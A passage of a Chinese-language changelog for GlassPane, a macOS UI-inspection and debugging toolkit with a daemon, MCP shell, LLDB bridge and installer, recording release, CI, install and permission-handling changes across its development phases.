  `MAX_TRACE_SAMPLES`、B-24 语义；`ApprovalGate` 的 `StateRoot.approvalsFile` 与 `autoApprover="daemon:auto"`），
  engine 迁移至 `StateRoot` 工厂构造，`TestIsolationGateTests` 扫描通过。

### Changed

- 发布前版本线从 `1.1.0` 升至 `1.1.1`（原因：`1.1.0` 已在 GitHub 先存在并钉在更早的 tag 上，为避免 npm 发布的
  `1.1.0` 与 GitHub Release 内容漂移，改为推送新的 `v1.1.1`）。含 iterate 合并的最新代码落在 `1.1.1`，三线
  （tag=main=npm）对齐。

## [1.1.0] — 2026-09-22

一次基础设施审计的结果：本仓库被逐条对照作者的另一个项目检视，发现的全部问题在同一批提交中修完。

### Added

- **单一版本线**。此前四个包版本各自漂移（根 `@glasspane/monorepo` `1.0.0` / `glasspane-install` `1.0.0` /
  `glasspane-mcp` `0.1.0` / `@iterate/kernel` `0.1.0-draft.1`）。新增 `scripts/set-version.mjs` 以根 `package.json`
  为真源改写全部派生位点（四个 `package.json` + lockfile、`install.sh` 与 `installer/cli.js` 钉住的 release ref、
  mcp-shell 的 `serverInfo.version`、daemon `hello` 自报版本、`.app` 的 `CFBundleShortVersionString`，位点清单集中在
  `scripts/version-sites.mjs`），新增 `scripts/check-version.mjs` 在任意漂移时让构建失败，并新增 CI job 强制执行。
- **可复现的安装**。`install.sh` 原本 `git clone` 移动的默认分支（`main`），同一天两个用户可能拿到不同代码。现在
  clone 钉住的 release tag（`GLASSPANE_REF` 可覆盖，缺省即发布线），`GLASSPANE_REPO_URL` 覆盖能力保留。
- **`npx glasspane-install` 变成真话**。installer 自己的 README 承诺 npx 即可完成完整安装，而 `installer/cli.js`
  在定位不到仓库时直接 `throw new Error(repoMissingText())`——源码树必须先存在。现在安装器自举：定位不到仓库时
  clone 钉住的 tag 到 `~/glasspane` 并继续，与 `install.sh` 同一策略。
- **发布自动化**。`.github/workflows/release.yml` 新增 tag 触发的 GitHub Release job，产出确定性 source tarball +
  `SHA256SUMS.txt`（v1.1.0 的 Release 即由它生成，校验和经下载侧 `sha256sum -c` 独立复核）；手动 `workflow_dispatch`
  job 以 `npm publish --provenance` 发两个裸名包，直发被拒时自动回落 `npm stage publish`（Trusted Publishing 配成
  staged-only，"是否存在"最后一步 `npm stage approve` 留在 owner 手里）。dry 分支改用 `npm pack --dry-run`——npm 11
  的 `publish --dry-run` 不再纯本地，会查 registry 撞已发版本。
- **文档门面**。`README.md` 重写为英文主入口 + 新增 `README.zh-CN.md`；新增 `CONTRIBUTING.md`、`SECURITY.md`、`.github/CODEOWNERS` 与 issue / PR 模板。

- **自我 dogfood**。新增 `ITERATE.md` + `iterate.config.yaml`（本项目的 iterate onboarding 产物，AI 通道生成）：
  审查维度按层分 6 套蓝图，`validation.commands` 逐字收录从仓库根实测通过的 7 条门禁命令（与 `ci.yml` 各 lane 同源），
  并把 `specs/**` 与 `kernel/schemas/**` 设为禁区、归因核心与发布工作流设为需架构审批。
  验证：`iterate doctor` 18 项全通过、`iterate fingerprint` 无漂移、`scripts/validate.py config` 通过。

### Changed

- 四个包版本统一到 `1.1.0`。`1.1.0` 是两个已发布包都从未用过的号，不覆盖任何已发布产物（registry 实测：
  `glasspane-mcp` 仅有 `0.1.0`，`glasspane-install` 仅有 `1.0.0`）。

### Fixed

- **发布产物形状**。`mcp-shell` 的 bundle 步骤用 `cp -R ../kernel/schemas schemas` 复制 schema，重复执行时会嵌套。
  从 registry 拉下的 `glasspane-mcp@0.1.0` tarball 实测确认带着重复项（49 个文件，`package/schemas/schemas/*.json`
  与 `package/schemas/*.json` 并存）。该步骤现在幂等，并额外清除非入口的编译产物 `.js`/`.map` 残留——同一 tarball 里
  esbuild 单文件 bundle 与逐模块 `dist/*.js`、`dist/*.js.map` 曾一起打包，与"kernel 内联进一个 bundle"的形状不符。

### Notes

- **一键安装的诚实边界**。一条命令安装出来的是 ad-hoc 签名产物，没有 Apple Developer ID 签名、没有公证——这是记录在
  [P6 §13](specs/GlassPane_P6_实施规格_v6.0_探针SDK与LLDB桥实现.md) 的决策单，前置是一次付费的 Apple Developer
  Program（$99/年）。外部用户首次启动因此会被 Gatekeeper 拦下，需在系统设置里手动允许；此前 README 承诺"一键安装"却
  未带这条限定，与项目自陈的原则冲突（"拿不到数据就显示未验证，永远不会为了好看而点亮"）。
- **1.1.0 先在 GitHub 存在**。GitHub Release 与源码 tarball 已随 tag 产出；registry 上仍是 `glasspane-mcp@0.1.0`
  与 `glasspane-install@1.0.0`，直到 owner 跑一次 `mode=publish` 并 `npm stage approve`（发布不可逆，这最后一步刻意
  不自动化，见 [release.yml](.github/workflows/release.yml) 头部口径）。

## [0.1.0] — 2026-09-21 … 2026-09-22

唯一真实存在的发布 tag `v0.1.0`（打于 2026-09-22，指向 `927805c`）。

### Added

- 裸名发布形态落地（`4f78484`）：`glasspane-mcp`、`glasspane-install` 两个包上架 npm，`LICENSE` 为 MIT，公开
  `README.md`，`files` 白名单与 `bin` 就位——兑现
  [P4 §33.2](specs/GlassPane_P4_实施规格_v4.0_收口与里程碑一致性.md) 决策链条目 3 的裸名映射。GitHub 仓库转公开
  `jingzhao-l/GlassPane`，`install.sh` 的 curl 分发通道自此对外成立（P6 §13）。
- evidence schema 冻结执行 `0.1-draft → 0.1`（`0ec4d0e`）：`$id` / JSON Schema const / zod literal / Swift
  `schemaVersionConst` / fixtures ok-01…03 全绑定同步，读侧 `legacySchemaVersions` 保持 draft 期历史包可解码
  （[P6 §12](specs/GlassPane_P6_实施规格_v6.0_探针SDK与LLDB桥实现.md)）。
- `34cd904` 补上 provenance 发布通道与 publish-shape 守卫，并把 handler lane 的真 app 命中闭环（`spike/h1-retest-result.json`：
  `hitCount=1、level=strong`）；`927805c` 同步 `mcp-shell` 独立 lock 的 esbuild devDep；`0340e6a` 给 README 加
  npm / License / CI 徽章；`b65199d` 把公证决策单与"发布后遗留"清单入档 P6 §13。

## Phase B 入口与 CI 首跑收口（2026-09-21）

### Fixed

- CI 第一次真跑挖出三处潜伏缺陷（`b3d8002`）：Node 20 不展开带引号的 `test/*.test.mjs` glob（本地 Node 26 支持，
  故只在 CI 暴露）、`mcp-shell` job 没先构建 `file:../kernel` 依赖、`bridge` job 缺装 pytest。根因档案在
  [P1 v1.2 §11.9](specs/GlassPane_P1_实施规格_v1.2_GUI设置面板.md)。
- 请求超时定时器不再 `unref()`（`879117e`，`mcp-shell/src/engine-client.ts`）：unref 的定时器不维持事件循环，当
  "等 daemon 回应"是进程里唯一剩余工作时 Node 直接退出，超时永不交付——调用方拿到的是进程死亡而不是
  `GP_E_ENGINE_UNREACHABLE` 与 remedy。缺陷自 `fa537b4`（首个 mcp-shell 提交）就在；补一条在裸进程里验证的回归
  fixture `mcp-shell/test/fixtures/timeout-loop.mjs`（P1 v1.2 §11.9 第四处 / P1-S21）。
- 桥 attach 参数真缺陷修复（`b090567`）：lldb 无 `--attach` 选项，改 `-p` 并单测禁回潮，P6 §7.5 挂账自此收窄为纯
  环境项（调用方勾选开发者工具）。同批补 Phase B 前置补数三闸与 `spike/run_spikes2.py`。
- 两台真机回归闸（`5d72a9f`，P1-S8/S10 收尾）：`engine/.rebuild_survival_smoke.py`（换装 cdhash 已变、identifier
  与 designated requirement 未变的产物后权限仍 granted）与 `engine/.input_monitoring_registration_smoke.py`，前者
  改真实安装并重启现网作业故不进 CI。`.c6_smoke.py` 必须打隔离 socket 的约定入档（`13f9bdb`）。

## P6 §11 — 人工介入最小化审计（2026-09-19 … 2026-09-20）

审计口径：用户剩余动作必须收敛到物理性不可约操作（TCC 勾选 / 付款 / 发布授权），检测、验证、恢复一律机器化，
remedy 必须 agent 可执行且不许诺不存在的能力。八项发现的逐项落点见
[P6 §11](specs/GlassPane_P6_实施规格_v6.0_探针SDK与LLDB桥实现.md)。

### Added

- `degrade` 参数落地（`d4843c6`）：`GP_E_BUSY_INPUT` 的 remedy 此前指向一个不存在的 "degrade mode"，现在它指向
  真实参数（act 全链 → `acquireOperationRight(degradeOnBusy:)` → Dispatcher → mcp-shell schema）。
- `installer --restore-launchd`（`3507048`）：检测 → bootstrap → `hello` 自报校验 → 已加载未授权时 `kickstart -k`
  换进程复验，退出码即判定；`GP_E_ENGINE_UNREACHABLE` 的 remedy 同步换成该可执行命令。
- `engine/.p4i4_smoke.py` 与 `spike/run_h1_retest.py`（`9d90f06`）：P4-I4 拖拽引导逐卡机器断言，H1 真实 app 强归因
  率复测一条命令可跑（真机 24/24 strong = 100%，`stateSource=z2-mirror`，`hitCount=0` 如实记录）。
- 开发者工具席位接入机器验证（`801aaac`，P1 v1.2 §11.6）：`DebugCapabilityProbe` 受限真探测三态，未知失败报
  `spawnFailed` 而不冒充权限判定。

### Fixed

- SIGTERM/SIGINT 哑火真修（`a38054d` + `4e166f5`）：入口早期 `pthread_sigmask` + 专用 `sigwait` 线程消费 pending，
  收尾只 unlink `engine.sock`/`probe.sock`、不 close 在 `accept()` 中使用的 fd；`--grant-accessibility` 文案不再
  导向"给终端勾选"的借来席位。
- 面板 `launchctl` 路径写死 `/usr/bin/launchctl`（本机真值 `/bin/launchctl`，真机发现 F11），四类 launchd 动作
  抛错全被 `return nil` 吞掉，用户症状是"点了没反应"；同批修掉探测跑在主线程导致的看门狗冻结、把实测结论上到
  徽标、面板文案全面改为面向用户（`ac889a8`、`3894ab9`）。
- `ac889a8` 同时修好那份从未被解析成功的 CI YAML——步骤名 `Install kernel (local file: dep)` 含裸 `": "` 导致整份
  workflow 解析失败，GitHub 上每个 run 都是 0s failure、无 job、无日志（P1 v1.2 §11.9）。
- 崩溃夹具源纳入仓库（`90f04d4`，`bridge/crashcanary.swift`），P6 §7.5 夹具债闭环。

### Notes

- **一条无法自动化的验证，如实记下**：P4-I4 原口径是"拖拽无法自动模拟 → 待人工目视"。审计把它拆开——真机发现 F10：
  CGEvent 合成点击能驱动 macOS UI（标题栏双击 zoom 实测生效），但三种拟真形态共 6+ 次都无法启动 SwiftUI 的
  `.onDrag` 拖拽会话——拖拽是系统级不可合成维度，而该手势本身无独立授权语义（`handleDrop` 恒委托 `guide(kind)`）。
  于是可断言面全部机器化，"不可自动化"精确化到手势维度，人工目视项撤除（P4 §34.3 P4-I4、`engine/smoke.md` 17）。

## P6 — 探针 SDK 与 LLDB 桥（2026-09-19）

### Added

- [P6 v6.0 实施规格](specs/GlassPane_P6_实施规格_v6.0_探针SDK与LLDB桥实现.md)（`d732de0`）：补齐仓库内七项规格空白，
  §0 先登记 8 条实施期实测事实（`task_for_pid` 被拒、attach 被拒、SB API 可用、swift-syntax 603 可达、lldb 冷启动
  惩罚、Text-AXValue 可见性边界、菜单徽标噪声、act 全窗 463ms）。
- `GlassPaneProbe` 独立 SPM 包 Z1–Z4.5 全级交付（`5b75f12`）：`#gpHandler` 宏（swift-syntax 603.0.2
  ExpressionMacro）、Z2 Mirror 有界遍历（深度 ≤8、节点 ≤4000）、Z3 KVC 实时 state 事件、Z4.5 `MTLCaptureManager`
  描述符式捕获。swift-syntax 不进 daemon 构建图；probe 10 用例。
- daemon 探针链路全面接线（`329829b`）：`probe.sock` 多连接 NDJSON + `ProbeInbox` 窗口归属/迟到计数/防篡改 digest
  复核；分类器 T4/T5/T7/T8 + strong 归因首次落地；档 1 兑现 P5 预留槽（`checkpoint_export` 真值 payload +
  `rollback_full` 执行面，`evicted`/`setter-missing`/分歧三路如实拒绝不假保真）。engine 319 用例。
- LLDB 桥（`962b08b`，`bridge/glasspane_bridge.py`）：Python + SB API，capture/trace/interactive 三模式，Z4 硬件
  watchpoint 4 槽 + FIFO64，`test_bridge.py` 17 纯函数用例；launch-capture 端到端真机打通见 `4fa83d7`（实证 batch
  模式在 crash stop 即终止会话，真机发现 F9）。kernel schema 转真值三点同步 + `gp_probe_status`（`2068f2e`）把
  工具面推到 14。

### Notes

- spike 首轮真数据（`a52dd2c`、`7470e45`，[spike/results.md](spike/results.md)）：H3 双口径扫描 strict 17.4% < 20% ✓；
  **H7 超阈**（宏冷全量 +720%、增量 +102% 超 C1 预算）触发规格预设的失败动作——宏转 opt-in，Z1 语义由手动
  `GP.recordState`/`GP.recordHandler` 承担；H4 按 §10.1 失败动作降为基线对比通道。attach 面当时仍为 kernel not
  permitted（`4fa83d7`），P6 §7.1 判定 TCC 开发者工具授权是用户动作。

## P4 — 收口与一键安装（2026-09-18 … 2026-09-19）

### Added

- [P4 v4.0](specs/GlassPane_P4_实施规格_v4.0_收口与里程碑一致性.md) 收口与里程碑一致性检查（`174e783`）：实施规格
  系列最终版，含全量验收清点总表与铁约束遵守复核（§30–§32）。遗留项落实：B7/C6/D6 真机冒烟资产入库并跑通
  （`71eee50`），收口记录与分发形态决策入档 §33（`569ceb2`）。
- 一键安装器 `installer/cli.js`：纯 Node ESM、零第三方依赖、Node ≥18（`88c5bfa`，P4 §34），纯逻辑 11 用例
  （`600243b`，P4-I1）；端到端真机走通见 §34.3 P4-I2。GUI 打包 `make-app.sh` 零依赖生成 minimal bundle（`848f37e`）、
  daemon 开机自启 launchd plist + `launchctl bootstrap`（`39a2a13`，`--no-launchd` 可跳过）。
- 设置面板拖拽引导：拖 app 图标到权限卡精确打开系统面板 + 1s 轮询自动点亮（`01995ae`，P1 v1.2 §10），
  `PermissionGuide` 深链映射与诚实边界 10 用例（`734aaf4`，P1-G1）。
- `install.sh` 一键入口与 MCP 配置片段输出（`0fe0992`，P4 §35）；§33.2 落发布决策链全记录（Phase B 门控 / org 出局
  证据 / 裸名映射 / kernel 命名裁决 / installer 一等渠道），installer 21 用例。
- C33/T9 真机冒烟脚本落地并跑通（`c182259`，P4 §34.5）：`glasspaned --check-input-permission` 三态探测、
  `.c33_smoke.py` 多实例发现、`.t9_smoke.py` 泄漏金丝雀 16 轮触发 `diagnose.class=T9`。

### Fixed

- daemon 审批台账显式持久化路径（`8e9b776`）：`ApprovalGate()` 默认 path 为 nil 即纯内存台账，restore 执行成功但
  `approvals.json` 不落盘、`--approval-verify` 恒 count 0。
- 权限主体与产物身份修正（`426913c`、`c5a739b`）：面板不再代测 daemon 席位；同批实测发现同一 bundle 经 `open` 起与
  经 launchd 起自报读数不同（真机对照：用户实际只勾了屏幕录制，另两项是从启动者借来的），口径入档 P1 v1.2 §11.1
  （`c197836`）。
- daemon 默认注入 `AttributionGuard`（`c99c026`，P4 §36）：tap 创建即权限如实探测，失败自动降级回纯互斥形态而非
  谎称启用；`.c33_smoke.py` 升级三阶段真机全过。

### Notes

- 发布形态就位但发布动作暂缓（`21cd7f6`、`6cda8bd`、`468dcc0`）：`npm publish --dry-run` 零警告，但 registry 上
  `@glasspane`/`@iterate` org 均不存在、`@iterate/kernel` 是 `file:` 依赖，两条仓库外前置未解除。根 workspace 全绿
  守护 job `install-gate` 同期接入（`55f6d3c`）。
- **launchd 自启形态的辅助功能授权未闭环**（P4 §36.3）：同路径二进制终端子进程可 attach，launchd 拉起报
  `GP_E_AX_UNAVAILABLE`（TCC 随责任进程归属）。用户动作面收敛为"仅勾选"，恢复由 `--restore-launchd` 承担。

## P5 — 方向候选四连批（2026-09-18）

### Added

- [P5 v5.0 规格](specs/GlassPane_P5_实施规格_v5.0_方向候选四连批.md)（`aa88f71`）：新系列首版，四批连发；收口
  `bd217a6` 记验收表 P5-A/B/C/D/E 全部 ✓，用例 engine 284 / mcp-shell 65 / kernel 47。
- 批一审批签名链（`123ef85`）：`ApprovalGate` 哈希链 + 持久化 + EngineCore 登记 + CLI 审计/校验；批二恢复快照
  tier-1 基建（`0f5c452`）：`SnapshotProbeInfo` + `RestorePipeline` 计划/校验/防篡改。
- 批三保留策略按天数/项目维度（`6ef8f11`）、批四 CLI 维护入口（`6f17122`：`--prune-evidence` / `--evidence-stats` / `--older-than` / `--project` / `--dry-run`）。

### Fixed

- `approvalGate` 注入缺口（`ff4f1d6`）：daemon 构造未挂默认路径审批台账，与 P5 §3.4 不一致。

## P3 — 三方消费者一致性与两次形态评估（2026-09-17 … 2026-09-18）

### Added

- [P3 v3.0 规格](specs/GlassPane_P3_实施规格_v3.0_三方消费者一致性.md)（`bbfe12b`）：C28/C35 三点回环与失败三分类
  归因（基于 v2.1 逐字继承，仅追加 §21–23）。落地为 `DecisionLogEntry` Swift Codable（`aa80c6f`，+11 用例）与 mcp-shell 以 kernel fixtures 为真值的三层回环契约测试（`aeb84d9`，+9 用例）。

### Notes

- 两次形态评估均以"维持现状 + 显式守卫条件"收口，不开启实现批次：v3.1 复审 Swift 手写 MCP 消息层 → 维持 TS 壳
  （`0169d81`），v3.2 复审 LLDB 桥形态 → 维持 Python SB API、C++ plugin 不自动激活（`e886d8f`）。两版均写有
  "触发重估条件"以防关闭即永冻。

## P2 — 并发归因污染防护与渐进退化检测（2026-09-17）

### Added

- 批一 C33（`4352ff2`）：`InputEventSource` + `AttributionGuard`——操作权互斥、输入空闲检测、污染标注
  （`EngineP2Batch1Tests`）。批二 T9 渐进退化检测（`da1d06e`）：三信号联合判定、熔断升级、诊断归类。

### Notes

- 判定逻辑为无 AX 依赖的合成单测，本批只交付单测面：
  [P2 v2.0 §16.2](specs/GlassPane_P2_实施规格_v2.0_并发归因污染防护.md) 的真机冒烟口径当时留为"待人工/待授权"，
  直到 2026-09-19 的 P4 §34.5 与 §36（daemon 注入 guard）才收口。

## P1 — SCK 迁移、快照恢复、GUI 面板与 evidence 生命周期（2026-09-16 … 2026-09-17）

### Added

- ScreenCaptureKit 像素捕获迁移 + 屏幕录制权限 onboarding（`eeabcd5`，P1 v1.0），替换 P0 已弃用的
  `CGWindowListCreateImage` 通道；路径 B 回退为 macOS 13 `SCStream` 单帧捕获桥（`a7e82ad`）。
- 快照/恢复原语 + 性能型熔断（`ab61a91`，P1 v1.1）：工具面六工具 → 八工具（`gp_snapshot`/`gp_restore`）。
  GUI 设置面板（`6126a61`，P1 v1.2）：权限 onboarding 可视化；evidence 审查 UX（`ed7287d`，P1 v1.3）。
- 批五多项目注册表与配方管理（`3964800`，spec v1.4），验收标记随后同步为"已实现并单测通过"（`c2fd954`）；
  批六 evidence 持久化落盘（`cc795be`，P1 v1.5）与批七归档生命周期（`903bb9c`，P1 v1.6）：限量修剪、统计、清空。

### Notes

- 路径 B 只有编译保证：本机为 macOS 26，macOS 13 上的首帧真机行为未验证，风险与延后口径写在
  [P1 v1.0 §5.2](specs/GlassPane_P1_实施规格_v1.0_SCK迁移.md)。

## P0 — 规格奠基与最小闭环（2026-09-14 … 2026-09-15）

### Added

- 设计-of-record 入档：5.7 项目综述（含 5.6 存档）与 PRD v1.0（`b8527b7`）、5.8 综述 R41–R45 实施级深化与
  [P0 实施规格 v1.0](specs/GlassPane_P0_实施规格_v1.0.md)（`c576135`）。
- `@iterate/kernel` Phase A（`d542494`）：JSON Schema 真源 + zod 双绑定 + C35 双侧 roundtrip 测试。
- GlassPane Engine Core + `glasspaned` daemon + 真机冒烟流程（`0e02454`，27 文件 / 4081 行）。
- MCP stdio 壳（`fa537b4`）：手写 JSON-RPC 2.0 + 六工具 + engine 客户端；`gp_last_evidence` 返回前先以 kernel
  schema 强校验 evidence 包（`0842477`）。GitHub Actions CI 三侧 job（`5b13334`）：swift / kernel / mcp-shell。

### Fixed

- daemon 忽略 `SIGPIPE`，客户端断开不再崩溃（`815c1a1`）；`treeSnapshot` 增加总量超时预算，`observe` 不再被无响应
  应用阻塞（`0ab7e60`）。kernel `ajv` 8.17.1 → 8.20.0 修复 moderate ReDoS（`d74342e`），并同步规格里的版本钉扎
  （`ef243ed`）。

### Notes

- 从第一天起就写明降级不是失败：[P0 §9](specs/GlassPane_P0_实施规格_v1.0.md) 规定 handler/state 信号缺失时 evidence
  显式 `null` 且 T4/T5/T7/T8/T9 落 `INCONCLUSIVE`；屏幕录制拒绝时 `pixelDiff=null` + 熔断 level 1，T3 判定仍可用。
  `contaminated` 字段先存在、语义恒 false，等 P2 填充。
- **CI 从一开始就不承载真机面**：[P0 §7.3](specs/GlassPane_P0_实施规格_v1.0.md) 把 A7 真机冒烟列为人工/自建 runner
  验收步骤，[engine/smoke.md](engine/smoke.md) 开篇即写"CI 不承载本流程：AX 依赖辅助功能权限与真实 GUI 会话"。此后所有
  AX/CGEvent/LLDB attach 类验收（B7/C6/D6、C33/T9、P4-I4、P6-E、`.rebuild_survival_smoke.py`）都在开发者本机完成。
